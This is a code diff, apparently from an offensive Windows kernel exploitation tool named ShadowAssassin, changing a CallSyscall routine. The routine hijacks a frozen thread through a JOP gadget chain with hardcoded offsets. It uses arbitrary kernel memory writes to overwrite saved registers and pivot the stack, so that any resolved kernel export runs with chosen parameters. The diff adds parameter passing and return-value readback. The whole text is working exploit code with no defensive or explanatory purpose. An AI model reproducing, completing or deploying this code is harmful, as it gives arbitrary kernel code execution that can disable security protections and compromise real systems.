@@ -380,57 +380,52 @@ UINT64 ShadowAssassin::CallSyscall(const std::string& name, const std::vector<UI
 
     UINT64 funcAddr = ResolveKernelExport(name);
     if (!funcAddr) {
-        DbgLog("[CallSyscall] FAIL: ResolveKernelExport returned 0 for '%s'\n", name.c_str());
+        DbgLog("[CallSyscall] FAIL: '%s' not found\n", name.c_str());
         return 0;
     }
-    DbgLog("[CallSyscall] Resolved '%s' -> 0x%llX\n", name.c_str(), funcAddr);
+    DbgLog("[CallSyscall] %s -> 0x%llX\n", name.c_str(), funcAddr);
 
     frameManager.CreateFrozenThread();
 
     UINT64 frameBase = frameManager.GetFrameAddress();
     if (!frameBase) {
-        DbgLog("[CallSyscall] FAIL: frameBase is 0 after CreateFrozenThread\n");
+        DbgLog("[CallSyscall] FAIL: no frame\n");
         return 0;
     }
-    DbgLog("[CallSyscall] frameBase=0x%llX\n", frameBase);
-
-
 
     jopManager.Build(0x0078CB9E, 0x006d066a, 0x00671319, 0x0061cbb5);
     jopManager.SetCallTarget(funcAddr);
     jopManager.SetRestoreRip(frameManager.ReadStoredRegister("rip"));
     jopManager.Commit();
 
-	frameManager.WriteRegister("rax", jopManager.GetRax());
-	frameManager.WriteRegister("rsi", jopManager.GetRsi());
-	// rdi set by stack via "pop rdi" setup gadget — non-volatile, survives function call
-	// rdi not via trap frame (SYSRET doesn't restore non-volatile regs from KTRAP_FRAME)
-	frameManager.WriteRegister("rip", jopManager.GetRip());
+    // Register setup
+    frameManager.WriteRegister("rax", jopManager.GetRax());
+    frameManager.WriteRegister("rsi", jopManager.GetRsi());
+    frameManager.WriteRegister("rip", jopManager.GetRip());
 
-	// Stack layout — old working layout + rdiForJmp on top:
-	//   RSP = newRsp+0x30
-	//   [+0x30] = rdiForJmp       ← setup gadget pop rdi reads this, then call uses [+0x30] for ret addr
-	//   [+0x38..+0x50] = home slots 1-4 (function clobbers, trash pops discard)
-	//   [+0x58] = GetRdx()        ← gadget2 pops rdx from here ✓
-	//   [+0x60] = originalRsp     ← gadget4 pop rsp (same slot that worked before) ✓
-	UINT64 originalRsp = frameManager.ReadStoredRegister("rsp");
-	UINT64 newRsp = originalRsp - 0x800; // 2KB below — below the kernel's resume stack usage
+    // Function parameters (x64: rcx, rdx, r8, r9)
+    if (params.size() > 0) frameManager.WriteRegister("rcx", params[0]);
+    if (params.size() > 1) frameManager.WriteRegister("rdx", params[1]);
+    if (params.size() > 2) frameManager.WriteRegister("r8",  params[2]);
+    if (params.size() > 3) frameManager.WriteRegister("r9",  params[3]);
 
-	writeFn(newRsp + 0x60, originalRsp);
-	writeFn(newRsp + 0x58, jopManager.GetRdx());
-	writeFn(newRsp + 0x30, jopManager.GetRdiForJmp()); // setup gadget pops rdi from here
+    // Stack: rdiForJmp on top, then home space, then GetRdx(), then originalRsp
+    UINT64 originalRsp = frameManager.ReadStoredRegister("rsp");
+    UINT64 newRsp = originalRsp - 0x800;
 
-	frameManager.WriteRegister("rsp", newRsp + 0x30);
-	DbgLog("[CallSyscall] rsp=0x%llX rdi@+0x30=0x%llX rdx@+0x58=0x%llX orig@+0x60=0x%llX\n",
-		newRsp + 0x30, jopManager.GetRdiForJmp(), jopManager.GetRdx(), originalRsp);
+    writeFn(newRsp + 0x60, originalRsp);
+    writeFn(newRsp + 0x58, jopManager.GetRdx());
+    writeFn(newRsp + 0x30, jopManager.GetRdiForJmp());
 
+    frameManager.WriteRegister("rsp", newRsp + 0x30);
+    DbgLog("[CallSyscall] firing — rsp=0x%llX params=%llu\n", newRsp + 0x30, params.size());
 
-    UINT64 current_rip = frameManager.ReadRegister("rip");
-    printf("[CallSyscall] Current RIP (set breakpoint here) %llx \n", current_rip);
-
-    Sleep(100);
-	__debugbreak();
     frameManager.ContinueThread();
-    DbgLog("[CallSyscall] Thread continued, returning funcAddr=0x%llX\n", funcAddr);
-    return funcAddr;
+
+    // Wait for chain to complete, then read return value from scratch
+    Sleep(200);
+    UINT64 retVal = 0;
+    readFn(&retVal, jopManager.GetReturnValueAddr(), sizeof(UINT64));
+    DbgLog("[CallSyscall] %s returned 0x%llX\n", name.c_str(), retVal);
+    return retVal;
 }
